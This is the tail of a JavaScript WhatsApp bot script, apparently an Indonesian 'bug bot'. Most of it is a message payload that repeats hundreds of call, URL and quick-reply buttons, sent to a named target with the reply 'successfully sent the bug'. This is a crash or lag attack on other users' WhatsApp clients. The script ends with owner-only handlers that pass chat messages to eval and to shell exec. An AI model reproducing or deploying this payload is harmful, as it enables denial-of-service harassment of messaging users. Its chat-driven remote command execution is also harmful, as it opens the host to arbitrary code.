{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
  { callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
   { callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
 { callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
 { callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
  { callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
   { callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
 { callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
 { callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
  { callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
   { callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
 { callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quoted: vtext }
]})
}
reply(`Sukses Mengirimkan Bug Kepada @${q} !`)
break

default:
}
if (budy.startsWith('=>')) {
if (!isOwner) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)
}
return msg.reply(bang)
}
try {
msg.reply(util.format(eval(`(async () => { ${budy.slice(3)} })()`)))
} catch (e) {
msg.reply(String(e))
}
}
if (budy.startsWith('>')) {
if (!isOwner) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await msg.reply(evaled)
} catch (err) {
msg.reply(String(err))
}
}
if (budy.startsWith('<')) {
if (!isOwner) return
try {
return msg.reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
reply(e)
}
}
if (budy.startsWith('$')){
if (!isRealOwner) return
qur = budy.slice(2)
exec(qur, (err, stdout) => {
if (err) return msg.reply(`${err}`)
if (stdout) {
msg.reply(stdout)
}
})
}
} catch (err) {
msg.reply(util.format(err))
}
} 